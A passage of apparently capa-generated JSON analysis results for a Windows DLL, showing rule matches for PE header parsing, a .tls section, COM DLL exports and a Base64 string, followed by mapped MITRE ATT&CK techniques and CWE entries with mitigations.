                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 3,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "basic block"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807622
                    },
                    {
                      "type": "absolute",
                      "value": 1651807592
                    },
                    {
                      "type": "absolute",
                      "value": 1651807529
                    },
                    {
                      "type": "absolute",
                      "value": 1651807625
                    },
                    {
                      "type": "absolute",
                      "value": 1651807504
                    },
                    {
                      "type": "absolute",
                      "value": 1651807604
                    },
                    {
                      "type": "absolute",
                      "value": 1651807573
                    },
                    {
                      "type": "absolute",
                      "value": 1651807541
                    },
                    {
                      "type": "absolute",
                      "value": 1651807613
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "offset",
                          "offset": 60,
                          "description": "IMAGE_DOS_HEADER.e_lfanew"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807541
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "not"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "nzxor"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "some",
                      "count": 2
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 12,
                          "description": "IMAGE_SECTION_HEADER.VirtualAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807592
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 20,
                          "description": "IMAGE_SECTION_HEADER.PointerToRawData"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807554
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 16,
                          "description": "IMAGE_SECTION_HEADER.SizeOfRawData"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651807856
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "instruction"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "operand offset",
                              "index": 1,
                              "operand_offset": 6,
                              "description": "IMAGE_NT_HEADERS.FileHeader.NumberOfSections"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651807910
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "mov"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "movzx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807910
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807910
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "basic block"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "IMAGE_FIRST_SECTION(nt_header)"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "subscope",
                                  "scope": "instruction"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 20,
                                          "description": "IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 1651807905
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "statement",
                                        "statement": {
                                          "type": "or"
                                        }
                                      },
                                      "children": [
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "add"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "mov"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": true,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "movzx"
                                            }
                                          },
                                          "children": [],
                                          "locations": [
                                            {
                                              "type": "absolute",
                                              "value": 1651807905
                                            }
                                          ],
                                          "captures": {}
                                        }
                                      ],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807905
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 24,
                                  "description": "FileHeader.SizeOfOptionalHeader"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651807915
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "(DWORD)dll_raw + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 40,
                                  "description": "sizeof(IMAGE_SECTION_HEADER)"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 248,
                                          "description": "sizeof(IMAGE_NT_HEADERS32)"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 264,
                                          "description": "sizeof(IMAGE_NT_HEADERS64)"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807892
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 3,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "basic block"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651807936
                    },
                    {
                      "type": "absolute",
                      "value": 1651807880
                    },
                    {
                      "type": "absolute",
                      "value": 1651807976
                    },
                    {
                      "type": "absolute",
                      "value": 1651807948
                    },
                    {
                      "type": "absolute",
                      "value": 1651807856
                    },
                    {
                      "type": "absolute",
                      "value": 1651807924
                    },
                    {
                      "type": "absolute",
                      "value": 1651807892
                    },
                    {
                      "type": "absolute",
                      "value": 1651807956
                    },
                    {
                      "type": "absolute",
                      "value": 1651807965
                    },
                    {
                      "type": "absolute",
                      "value": 1651807967
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "offset",
                          "offset": 60,
                          "description": "IMAGE_DOS_HEADER.e_lfanew"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807892
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "not"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "nzxor"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "some",
                      "count": 2
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 12,
                          "description": "IMAGE_SECTION_HEADER.VirtualAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807936
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 20,
                          "description": "IMAGE_SECTION_HEADER.PointerToRawData"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651807905
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 16,
                          "description": "IMAGE_SECTION_HEADER.SizeOfRawData"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651808000
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "os",
                      "os": "windows"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "no address"
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "instruction"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "and"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "operand offset",
                              "index": 1,
                              "operand_offset": 6,
                              "description": "IMAGE_NT_HEADERS.FileHeader.NumberOfSections"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651808063
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "mov"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "mnemonic",
                                  "mnemonic": "movzx"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651808063
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651808063
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "subscope",
                      "scope": "basic block"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "IMAGE_FIRST_SECTION(nt_header)"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "subscope",
                                  "scope": "instruction"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 20,
                                          "description": "IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "absolute",
                                          "value": 1651808054
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "statement",
                                        "statement": {
                                          "type": "or"
                                        }
                                      },
                                      "children": [
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "add"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "mov"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": true,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "mnemonic",
                                              "mnemonic": "movzx"
                                            }
                                          },
                                          "children": [],
                                          "locations": [
                                            {
                                              "type": "absolute",
                                              "value": 1651808054
                                            }
                                          ],
                                          "captures": {}
                                        }
                                      ],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651808054
                                }
                              ],
                              "captures": {}
                            },
                            {
                              "success": true,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "operand offset",
                                  "index": 1,
                                  "operand_offset": 24,
                                  "description": "FileHeader.SizeOfOptionalHeader"
                                }
                              },
                              "children": [],
                              "locations": [
                                {
                                  "type": "absolute",
                                  "value": 1651808058
                                }
                              ],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "and",
                              "description": "(DWORD)dll_raw + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "number",
                                  "number": 40,
                                  "description": "sizeof(IMAGE_SECTION_HEADER)"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "i386"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 248,
                                          "description": "sizeof(IMAGE_NT_HEADERS32)"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "statement",
                                    "statement": {
                                      "type": "and"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "arch",
                                          "arch": "amd64"
                                        }
                                      },
                                      "children": [],
                                      "locations": [
                                        {
                                          "type": "no address"
                                        }
                                      ],
                                      "captures": {}
                                    },
                                    {
                                      "success": false,
                                      "node": {
                                        "type": "feature",
                                        "feature": {
                                          "type": "operand offset",
                                          "index": 1,
                                          "operand_offset": 264,
                                          "description": "sizeof(IMAGE_NT_HEADERS64)"
                                        }
                                      },
                                      "children": [],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651808054
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "range",
                      "min": 3,
                      "max": 9223372036854775808,
                      "child": {
                        "type": "basic block"
                      }
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651808000
                    },
                    {
                      "type": "absolute",
                      "value": 1651808128
                    },
                    {
                      "type": "absolute",
                      "value": 1651808071
                    },
                    {
                      "type": "absolute",
                      "value": 1651808136
                    },
                    {
                      "type": "absolute",
                      "value": 1651808144
                    },
                    {
                      "type": "absolute",
                      "value": 1651808151
                    },
                    {
                      "type": "absolute",
                      "value": 1651808088
                    },
                    {
                      "type": "absolute",
                      "value": 1651808025
                    },
                    {
                      "type": "absolute",
                      "value": 1651808158
                    },
                    {
                      "type": "absolute",
                      "value": 1651808163
                    },
                    {
                      "type": "absolute",
                      "value": 1651808100
                    },
                    {
                      "type": "absolute",
                      "value": 1651808037
                    },
                    {
                      "type": "absolute",
                      "value": 1651808108
                    },
                    {
                      "type": "absolute",
                      "value": 1651808117
                    },
                    {
                      "type": "absolute",
                      "value": 1651808054
                    },
                    {
                      "type": "absolute",
                      "value": 1651808120
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "offset",
                          "offset": 60,
                          "description": "IMAGE_DOS_HEADER.e_lfanew"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651808037
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "not"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "nzxor"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "some",
                      "count": 2
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 12,
                          "description": "IMAGE_SECTION_HEADER.VirtualAddress"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651808088
                        },
                        {
                          "type": "absolute",
                          "value": 1651808163
                        },
                        {
                          "type": "absolute",
                          "value": 1651808151
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 20,
                          "description": "IMAGE_SECTION_HEADER.PointerToRawData"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651808140
                        },
                        {
                          "type": "absolute",
                          "value": 1651808054
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "operand offset",
                          "index": 1,
                          "operand_offset": 16,
                          "description": "IMAGE_SECTION_HEADER.SizeOfRawData"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "contain a thread local storage (.tls) section": {
        "meta": {
          "name": "contain a thread local storage (.tls) section",
          "namespace": "executable/pe/section/tls",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "file",
            "dynamic": "file"
          },
          "attack": [],
          "mbc": [],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 16-02.exe_"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: contain a thread local storage (.tls) section\r\n    namespace: executable/pe/section/tls\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    scopes:\r\n      static: file\r\n      dynamic: file\r\n    examples:\r\n      - Practical Malware Analysis Lab 16-02.exe_\r\n  features:\r\n    - section: .tls\r\n",
        "matches": [
          [
            {
              "type": "no address"
            },
            {
              "success": true,
              "node": {
                "type": "feature",
                "feature": {
                  "type": "section",
                  "section": ".tls"
                }
              },
              "children": [],
              "locations": [
                {
                  "type": "absolute",
                  "value": 1651859456
                }
              ],
              "captures": {}
            }
          ]
        ]
      },
      "implement COM DLL": {
        "meta": {
          "name": "implement COM DLL",
          "namespace": "executable/pe",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "file",
            "dynamic": "file"
          },
          "attack": [],
          "mbc": [],
          "references": [
            "https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject"
          ],
          "examples": [],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: implement COM DLL\r\n    namespace: executable/pe\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: file\r\n      dynamic: file\r\n    references:\r\n      - https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-dllgetclassobject\r\n  features:\r\n    - and:\r\n      - export: DllGetClassObject\r\n      - optional:\r\n        - export: DllRegisterServer\r\n",
        "matches": [
          [
            {
              "type": "no address"
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "export",
                      "export": "DllGetClassObject"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 1651774656
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "optional"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "export",
                          "export": "DllRegisterServer"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 1651774592
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "reference Base64 string": {
        "meta": {
          "name": "reference Base64 string",
          "namespace": "data-manipulation/encoding/base64",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "file",
            "dynamic": "file"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Obfuscated Files or Information"
              ],
              "tactic": "Defense Evasion",
              "technique": "Obfuscated Files or Information",
              "subtechnique": "",
              "id": "T1027"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Data",
                "Encode Data",
                "Base64"
              ],
              "objective": "Data",
              "behavior": "Encode Data",
              "method": "Base64",
              "id": "C0026.001"
            },
            {
              "parts": [
                "Data",
                "Check String"
              ],
              "objective": "Data",
              "behavior": "Check String",
              "method": "",
              "id": "C0019"
            }
          ],
          "references": [],
          "examples": [
            "BFB9B5391A13D0AFD787E87AB90F14F5",
            "074072B261FC27B65C72671F13510C05",
            "5DB2D2BE20D59AA0BE6709A6850F1775"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: reference Base64 string\r\n    namespace: data-manipulation/encoding/base64\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: file\r\n      dynamic: file\r\n    att&ck:\r\n      - Defense Evasion::Obfuscated Files or Information [T1027]\r\n    mbc:\r\n      - Data::Encode Data::Base64 [C0026.001]\r\n      - Data::Check String [C0019]\r\n    examples:\r\n      - BFB9B5391A13D0AFD787E87AB90F14F5\r\n      - 074072B261FC27B65C72671F13510C05\r\n      - 5DB2D2BE20D59AA0BE6709A6850F1775\r\n  features:\r\n    - string: /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\r\n",
        "matches": [
          [
            {
              "type": "no address"
            },
            {
              "success": true,
              "node": {
                "type": "feature",
                "feature": {
                  "type": "regex",
                  "regex": "/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                }
              },
              "children": [],
              "locations": [
                {
                  "type": "file",
                  "value": 38912
                },
                {
                  "type": "file",
                  "value": 39008
                }
              ],
              "captures": {
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_": [
                  {
                    "type": "file",
                    "value": 38912
                  }
                ],
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/": [
                  {
                    "type": "file",
                    "value": 39008
                  }
                ]
              }
            }
          ]
        ]
      }
    }
  },
  "MITRE": [
    [
      "T1082",
      "System Information Discovery",
      "Discovery"
    ],
    [
      "T1027",
      "Obfuscated Files or Information",
      "Defense Evasion"
    ],
    [
      "T1083",
      "File and Directory Discovery",
      "Discovery"
    ],
    [
      "T1129",
      "Shared Modules",
      "Execution"
    ],
    [
      "T1012",
      "Query Registry",
      "Discovery"
    ],
    [
      "T1087",
      "Account Discovery",
      "Discovery"
    ],
    [
      "T1033",
      "System Owner/User Discovery",
      "Discovery"
    ]
  ],
  "CWE": [
    [
      "compiler removal of code to clear buffers",
      "CWE-14",
      "::PHASE:Implementation:DESCRIPTION:Store the sensitive data in a volatile memory location if available.::PHASE:Build and Compilation:DESCRIPTION:If possible, configure your compiler so that it does not remove dead stores.::PHASE:Architecture and Design:DESCRIPTION:Where possible, encrypt sensitive data that are used by a software system.::"
    ],
    [
      "path equivalence: windows 8.3 filename",
      "CWE-58",
      "::PHASE:System Configuration:DESCRIPTION:Disable Windows from supporting 8.3 filenames by editing the Windows registry. Preventing 8.3 filenames will not remove previously generated 8.3 filenames.::"
    ],
    [
      "external control of file name or path",
      "CWE-73",
